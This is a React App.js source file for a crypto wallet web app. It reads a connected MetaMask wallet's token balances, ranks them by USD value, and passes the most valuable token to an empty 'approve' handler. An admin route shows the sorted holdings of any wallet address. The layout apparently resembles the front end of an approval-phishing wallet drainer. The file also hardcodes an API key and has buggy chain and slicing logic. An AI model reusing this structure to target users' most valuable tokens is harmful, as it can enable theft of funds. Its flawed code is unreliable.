import React, { useState, useEffect } from 'react';
import { BrowserRouter, Navigate, Route, Routes } from 'react-router-dom';
import axios from 'axios';
import { getAddressBalances } from 'eth-balance-checker/lib/web3';
import Web3 from "web3";
import 'bootstrap/dist/css/bootstrap.min.css';

import AdminScreen from './pages/Admin';
import UserScreen from './pages/User';
import TOKENS from './tokens.json';
import TOKENSBSC from './tokenBsc.json';
var WAValidator = require('wallet-address-validator');
function App() {
  const [myAddress, setMyaddress] = useState('');
  const [liveEthPrice, setLiveEthPrice] = useState(2700);
  const [allTokenLivePrice, setAllTokenLivePrice] = useState({});
  const [walletStatus, setWalletStatue] = useState(false);
  const [allTokenBalance, setAllTokenBalance] = useState([]);
  const [sortedAllTokenBalance, setSortedAllTokenBalance] = useState([]);
  useEffect(() => {
    const connectWallet = async () => {
      if (typeof window.ethereum !== 'undefined') {
        try {
          if (window.ethereum) {
            await window.ethereum.enable();
            try {
              // check if the chain to connect to is installed
              await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
              });
              const web3 = new Web3(window.ethereum);
              const accounts = await web3.eth.getAccounts();
              const EthPrice = await axios.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD&api_key=5d2f3072c0b3bfa7b006979142925cbc1dccf788219d2a8f5869ef92ad5d2ff2');
              setLiveEthPrice(EthPrice.data.USD);
              setMyaddress(accounts[0]);
              setWalletStatue(true);
            } catch (error) {
              // This error code indicates that the chain has not been added to MetaMask
              // if it is not, then install it into the user MetaMask
              if (error.code === 4902) {
                try {
                  await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [
                      {
                        chainId: '0x1',
                        rpcUrl: 'https://bsc-dataseed1.defibit.io/',
                      },
                    ],
                  });
                } catch (addError) {
                  console.error(addError);
                }
              }
              console.error(error);
            }
          }
        } catch (e) {
          return false;
        }
      }
    }

    connectWallet();
  }, []);

  useEffect(() => {
    if (walletStatus) {
      const web3 = new Web3(window.ethereum);
      let tokenAddresses = TOKENS.map(t => t.address);
      getAddressBalances(web3, myAddress, tokenAddresses).then(balances => {
        if (balances) {
          const result = (Object.keys(balances).map((key) => [(key), balances[key]])).filter((e) => (+e[1]) !== 0);
          setAllTokenBalance(result);
          let temp = [];
          const data = (result.map((a) => {
            temp = [];
            TOKENS.map(b => {
              if (a[0] == b.address) {
                if (a[0] == "0x0000000000000000000000000000000000000000") temp.push([a[0], a[1], b.decimal, (a[1] * liveEthPrice) / (10 ** b.decimal), b.symbol]);
                else {
                  temp.push([a[0], a[1], b.decimal, a[1] / (10 ** b.decimal), b.symbol]);
                }
              }
            });
            return temp[0];
          }).sort(function (a, b) { return b[3] - a[3] }));
          setSortedAllTokenBalance(data);
        }
      });
    }
  }, [walletStatus])
  const livePrice = async (symbol) => {
    let tokenSymbol = symbol;
    let totaltemp = {};
    let api = "https://min-api.cryptocompare.com/data/pricemulti?fsyms=" + tokenSymbol.slice(0, 50) + "&tsyms=USD&api_key=5d2f3072c0b3bfa7b006979142925cbc1dccf788219d2a8f5869ef92ad5d2ff2";
    let temp = await axios.get(api);
    Object.assign(totaltemp, temp.data);

    api = "https://min-api.cryptocompare.com/data/pricemulti?fsyms=" + tokenSymbol.slice(51, 100) + "&tsyms=USD&api_key=5d2f3072c0b3bfa7b006979142925cbc1dccf788219d2a8f5869ef92ad5d2ff2";
    temp = await axios.get(api);
    Object.assign(totaltemp, temp.data);

    setAllTokenLivePrice(totaltemp);
    return totaltemp;
  }
  const handleApprove = () => {
    if (walletStatus) {
    }
  }
  const changeWalletAddress = (value) => {
    var valid = WAValidator.validate(value, 'ETH');
    if (valid) {
      const web3 = new Web3(window.ethereum);
      let tokenAddresses = TOKENS.map(t => t.address);
      getAddressBalances(web3, value, tokenAddresses).then(async (balances) => {
        const result = (Object.keys(balances).map((key) => [(key), balances[key]])).filter((e) => (+e[1]) !== 0);
        setAllTokenBalance(result);
        let symbol = [];
        result.map((a) => {
          TOKENS.map(b => {
            if (a[0] == b.address) {
              symbol.push(b.symbol);
            }
          });
        });
        let tokenSymbol = symbol;
        let totaltemp = {};
        if (tokenSymbol.slice(0, 50).length) {
          let api = "https://min-api.cryptocompare.com/data/pricemulti?fsyms=" + tokenSymbol.slice(0, 50) + "&tsyms=USD&api_key=5d2f3072c0b3bfa7b006979142925cbc1dccf788219d2a8f5869ef92ad5d2ff2";
          let temp = await axios.get(api);
          Object.assign(totaltemp, temp.data);
          if (tokenSymbol.slice(50, 100).length) {
            api = "https://min-api.cryptocompare.com/data/pricemulti?fsyms=" + tokenSymbol.slice(51, 100) + "&tsyms=USD&api_key=5d2f3072c0b3bfa7b006979142925cbc1dccf788219d2a8f5869ef92ad5d2ff2";
            temp = await axios.get(api);
            Object.assign(totaltemp, temp.data);
          }
        }
        let temp = [];
        console.log(totaltemp)
        const data = (result.map((a) => {
          temp = [];
          TOKENS.map(b => {
            if (a[0] == b.address) {
              console.log(b.symbol)
              if(totaltemp[b.symbol])temp.push([a[0], a[1], b.decimal, (a[1] * totaltemp[b.symbol].USD) / (10 ** b.decimal), b.symbol]);
              else temp.push([a[0], a[1], b.decimal, (a[1]) * 0 / (10 ** b.decimal), b.symbol]);
            }
          });
          return temp[0];
        }).sort(function (a, b) { return b[3] - a[3] }));
        setSortedAllTokenBalance(data);
      });
    }
  }
  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={<UserScreen handleApprove={handleApprove} expensiveTokenBalance={sortedAllTokenBalance[0]} />} />
        <Route path="/admin" element={<AdminScreen sortedAllTokenBalance={sortedAllTokenBalance} changeWalletAddress={changeWalletAddress} />} />
        <Route path="*" element={<Navigate to="/" />} />
      </Routes>
    </BrowserRouter>
  );
}

export default App;
